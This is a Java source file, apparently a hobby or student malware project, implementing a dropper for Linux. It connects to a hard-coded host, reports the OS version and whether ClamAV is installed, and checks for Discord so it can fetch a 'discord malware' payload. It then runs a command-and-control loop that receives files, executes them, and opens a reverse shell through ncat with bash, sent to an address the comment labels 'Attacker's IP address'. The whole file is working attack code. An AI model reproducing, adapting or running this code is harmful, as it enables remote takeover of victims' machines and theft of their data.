import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
/** * downloader */
public class downloader {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("192.168.1.100", 1342);
        PrintWriter writer = new PrintWriter(socket.getOutputStream());
        InputStream input = socket.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(input));
        if (isLinux()) {
            writer.println("LINUX");
            writer.flush();
            if (hasClamAV()) {
                writer.println("HAS AV");
                writer.flush();
            } else {
                writer.println("NO AV");
                writer.flush();
            }

            // get the OS version
            OSversion(socket);

            // steal Discord chat
            if (hasDiscord()) {
                writer.println("HAS DISCORD");
                writer.flush();
                downloadMalware(input, "discord.java");
                writer.println("received discord malware");
                writer.flush();
            } else {
                writer.println("NO DISCORD");
                writer.flush();
            }

            //command and control
            while(true) {
                String cc;
                cc = reader.readLine();
                if (cc.equals("send")) {
                    String name = reader.readLine();
                    System.out.println(name);
                    downloadMalware(input, name);
                }
                else if (cc.equals("run")) {
                    cc = reader.readLine();
                    runMalware(socket, cc);
                }else if(cc.equals("you'r a bot")){
                    executeCommand(cc, socket);
                }
            }
        } else {
            writer.println("NOT LINUX");
            writer.flush();
        }
        socket.close();
    } //checks OS type
    // get all the running services -> to see if antivirus is installed
    // check is discord is installed
    // check if we can steal passwords
    static boolean isLinux() {
        String OS = System.getProperty("os.name").toLowerCase();
        if (OS.contains("unix") || OS.contains("linux")) return true;
        else return false;
    }
    static boolean hasClamAV()throws Exception {
        String[] command = {
                "clamscan",
                "-v"
        };
        try {
            Process processes = Runtime.getRuntime().exec(command);
            InputStream stream = processes.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(stream));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("ClamAV")) return true;
            }
        } catch (Exception e) {

        }
        return false;
    }
    static boolean hasDiscord() {
        if (Files.exists(Path.of(System.getProperty("user.home") + "/.config/discord"))) {
            return true;
        } else {
            return false;
        }
    }
    static void OSversion(Socket socket) {
        String[] command = {
                "uname",
                "-r"
        };
        String line = "";
        try {
            Process processes = Runtime.getRuntime().exec(command);
            InputStream stream = processes.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(stream));
            PrintWriter writer = new PrintWriter(socket.getOutputStream());
            line = reader.readLine();
            writer.println(line);
            writer.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    static void downloadMalware(InputStream input, String name) {
        try {
            File file = new File(name);
            file.createNewFile();
            FileOutputStream out = new FileOutputStream(name);

            int c;
            while ((c = input.read()) != 255) {
                out.write(c);
            }
            out.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    static void runMalware(Socket socket, String name) {
        String[] command = {
            "java",
            name
        };
        try {
            
            Process processes = Runtime.getRuntime().exec(command);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void executeCommand(String com, Socket socket) {
        //old way of executing commands, we discarded this because
        //it doesnt't allow execution of shell commands
        // try {
        //     Process process = Runtime.getRuntime().exec(command);
        //     // Read the output of the command
        //     BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        //     PrintWriter writer = new PrintWriter(socket.getOutputStream());
        //     String line;

        //     // Write back the command Output
        //     while ((line = reader.readLine()) != null) {
        //         writer.println(line);
        //     }

        //     writer.println("end of command is here blah blah blah");
        //     writer.flush();


        // } catch (IOException e) {
        // }
         try {
            //better way is to get a reverse shell
            String host = "192.168.1.100"; // Attacker's IP address
            int port = 4444; // Attacker's listening port

            String[] commands = {"/usr/bin/ncat", host, Integer.toString(port), "-e", "/bin/bash"};
            Process process = Runtime.getRuntime().exec(commands);

            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
